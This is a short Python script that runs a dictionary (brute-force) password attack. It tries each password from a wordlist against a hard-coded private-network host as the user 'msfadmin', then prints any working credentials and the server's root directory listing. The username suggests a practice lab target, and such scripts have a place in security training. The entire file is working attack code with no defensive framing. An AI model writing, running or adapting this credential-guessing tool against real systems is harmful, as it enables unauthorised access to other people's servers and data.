#!/usr/bin/python3.7
from pyftpclient.sftp_client import SFTPClient
import time

fail = '\033[91m[-]\033[0m'
ok  = '\033[92m[+]\033[0m'
msg_ok=" BINGO - Username: "
msg_fail=" FAIL - Username: "
msg_pass=" Password: "
wordlist="wordlist.txt"
msg_start=".....::: FTP Dictnary Attack  - pyFTPclient :::....." 
msg_final=".....::: FTP Dictnary Attack finished - pyFTPclient :::....." 
msg_sftpclient="List of files on / of home directory"
target = "10.171.1.129"
username = "msfadmin"
port = '21'

print(msg_start)

with open(wordlist, "r") as _word:
    for _line in _word:
        _password = _line.strip("\n")

        try:
            connection_config = {
                'hostname': target,
                'username': username,
                'password': _password,
                'port': int(port)
            }

            with SFTPClient(**connection_config) as sftpcliconn:
                print(ok + msg_ok + username + msg_pass + _password)
                print(msg_sftpclient)
                print(sftpcliconn.listdir('/'))
                sftpcliconn.disconnect
            
#            time.sleep(3)

        except:
            print( fail + msg_fail + username + msg_pass + _password)
#            time.sleep(5)

print(msg_final)
